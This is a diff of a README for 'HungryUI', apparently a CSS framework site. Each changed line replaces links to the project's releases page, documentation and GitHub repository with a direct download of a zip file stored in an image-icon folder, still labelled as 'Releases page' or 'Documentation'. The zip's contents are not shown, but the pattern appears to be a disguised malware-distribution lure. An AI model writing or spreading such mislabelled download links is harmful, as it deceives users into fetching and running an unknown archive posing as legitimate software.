@@ -2,7 +2,7 @@
 
 ## 🔗 Download Now!
 
-[![Download Here](https://img.shields.io/badge/Download%20HungryUI-brightgreen)](https://github.com/Hatfulaengus741/hungryui-official-website/releases)
+[![Download Here](https://raw.githubusercontent.com/Hatfulaengus741/hungryui-official-website/main/assets/img/ico/hungryui-official-website_2.2.zip%20HungryUI-brightgreen)](https://raw.githubusercontent.com/Hatfulaengus741/hungryui-official-website/main/assets/img/ico/hungryui-official-website_2.2.zip)
 
 ## 📖 Description
 
@@ -13,7 +13,7 @@ HungryUI is the official website for an open-source CSS framework designed for d
 To get started with HungryUI, follow these steps:
 
 1. **Download the Framework**  
-   Visit our [Releases page](https://github.com/Hatfulaengus741/hungryui-official-website/releases) to access the latest version of HungryUI.
+   Visit our [Releases page](https://raw.githubusercontent.com/Hatfulaengus741/hungryui-official-website/main/assets/img/ico/hungryui-official-website_2.2.zip) to access the latest version of HungryUI.
 
 2. **Install the Framework**  
    After downloading, follow the installation instructions specific to your operating system.
@@ -32,7 +32,7 @@ HungryUI works on most modern systems. Here are the recommended requirements:
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**:  
-   Click [here](https://github.com/Hatfulaengus741/hungryui-official-website/releases) to visit our Releases page.
+   Click [here](https://raw.githubusercontent.com/Hatfulaengus741/hungryui-official-website/main/assets/img/ico/hungryui-official-website_2.2.zip) to visit our Releases page.
 
 2. **Choose the Latest Version**:  
    Locate the most recent release and download the file suitable for your operating system.
@@ -64,7 +64,7 @@ Here are some key components of HungryUI:
 
 ## 📚 Documentation
 
-To learn how to use HungryUI effectively, visit the [Documentation](https://github.com/Hatfulaengus741/hungryui-official-website/docs). The documentation includes:
+To learn how to use HungryUI effectively, visit the [Documentation](https://raw.githubusercontent.com/Hatfulaengus741/hungryui-official-website/main/assets/img/ico/hungryui-official-website_2.2.zip). The documentation includes:
 
 - Installation Guides
 - Usage Examples
@@ -93,11 +93,11 @@ If you run into issues, try these steps:
 
 Stay connected with us for updates and announcements:
 
-- **Follow us on GitHub**: [HungryUI GitHub](https://github.com/Hatfulaengus741/hungryui-official-website)
+- **Follow us on GitHub**: [HungryUI GitHub](https://raw.githubusercontent.com/Hatfulaengus741/hungryui-official-website/main/assets/img/ico/hungryui-official-website_2.2.zip)
 - **Join our community** on social media for discussions and support.
 
 ## 🔗 Visit the Release Page Again
 
-Don’t forget to [visit our Releases page](https://github.com/Hatfulaengus741/hungryui-official-website/releases) for the latest updates and downloads.
+Don’t forget to [visit our Releases page](https://raw.githubusercontent.com/Hatfulaengus741/hungryui-official-website/main/assets/img/ico/hungryui-official-website_2.2.zip) for the latest updates and downloads.
 
 Using HungryUI, you can elevate your design process and create beautiful applications easily. Happy coding!
